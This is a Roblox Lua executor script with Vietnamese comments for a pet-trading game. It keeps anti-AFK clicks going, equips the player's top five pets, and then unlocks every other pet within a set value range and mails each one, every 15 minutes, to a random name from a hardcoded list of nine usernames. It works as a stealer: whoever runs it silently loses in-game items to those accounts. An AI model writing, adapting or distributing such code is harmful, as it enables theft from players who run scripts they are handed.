task.wait(1)
-- Kiểm tra biến toàn cục để xác định script đã chạy hay chưa
if _G.SCRIPT1 then
    warn("Script đã được chạy trước đó!")
    return -- Dừng script nếu đã chạy
end

-- Đánh dấu script đã được chạy
_G.SCRIPT1 = true

-- Script của bạn
getgenv().minsend = "100M"
getgenv().maxsend = "999m"
getgenv().username = { "MarksEvan8773", "BrightSandra4", "FrenchAngelica2", "BenderMichael2", "squir5ic", "start5ka", "tirin2ik", "unlov5xi", "jovia_3cw" }
getgenv().time = 15 --minutes
repeat
    wait()
until game:IsLoaded() and game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui") and game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("GUIFX Holder") and
    game:GetService("Players").LocalPlayer.PlayerGui["GUIFX Holder"].DisplayOrder == 999
local rs = game:GetService("ReplicatedStorage")
local save = require(rs.Library.Client.Save)
local Items = require(game:GetService("ReplicatedStorage").Library.Items.Types)
local plr = game.Players.LocalPlayer
local RAP = 0
local a = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)

local VirtualUser = game:service "VirtualUser"
game:service("Players").LocalPlayer.Idled:connect(
    function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end
)
local savepet = {}
local v0 = {
    k = "e3",
    m = "e6",
    b = "e9",
    t = "e12",
    q = "e15"
};
ParseNumberSmart = function(v1)
    if type(v1) == "string" then
        v1 = v1:gsub("[,%s%c%z]", "");
        if #v1 > 0 then
            local v2 = v0[v1:sub(#v1):lower()];
            if v2 then
                v1 = v1:sub(1, #v1 - 1) .. v2;
            end;
        end;
    end;
    return (tonumber(v1));
end;
local topPetIds = {}

while wait() do
    local eligiblePets = {}
    local maxDifficulty = 0

    for i, v in pairs(a) do
        for i1, v1 in pairs(save.Get().Inventory.Pet) do
            local currentDifficulty = tonumber(v.difficulty)
            if currentDifficulty and currentDifficulty >= ParseNumberSmart(getgenv().minsend) and v._id == v1.id and currentDifficulty <= ParseNumberSmart(getgenv().maxsend) then
                table.insert(eligiblePets, {
                    uid = i1,
                    id = v._id,
                    difficulty = currentDifficulty,
                    amount = v1._am or 1
                })
                if currentDifficulty > maxDifficulty then
                    maxDifficulty = currentDifficulty
                end
            end
        end
    end
    --
    table.sort(eligiblePets, function(a, b)
        return a.difficulty > b.difficulty
    end)

    local topPets = {}
    for i = 1, math.min(5, #eligiblePets) do
        table.insert(topPets, eligiblePets[i])
    end

    for i, v in next, save.Get().EquippedPets do
        local args = { [1] = i }
        game:GetService("ReplicatedStorage").Network.Pets_Unequip:FireServer(unpack(args))
        wait(1)
    end
    wait(1)
    for _, pet in ipairs(topPets) do
        if not topPetIds[pet.id] then
            local args = {
                [1] = pet.uid
            }

            game:GetService("ReplicatedStorage").Network.Pets_Equip:FireServer(unpack(args))
        end
        topPetIds[pet.id] = true
    end


    for i, v in pairs(a) do
        for i1, v1 in pairs(save.Get().Inventory.Pet) do
            local currentDifficulty = tonumber(v.difficulty)
            if currentDifficulty and currentDifficulty >= ParseNumberSmart(getgenv().minsend) and v._id == v1.id and not topPetIds[v1.id] and currentDifficulty <= ParseNumberSmart(getgenv().maxsend) then
                local args = {
                    [1] = i1,
                    [2] = false
                }

                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked")
                    :InvokeServer(unpack(args))

                game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(unpack({
                    [1] = getgenv().username[math.random(1, #getgenv().username)],
                    [2] = tostring(v1.id),
                    [3] = "Pet",
                    [4] = i1,
                    [5] = v1.amount or 1
                }))
                wait(1)
            end
        end
    end
    wait(getgenv().time * 60)
end
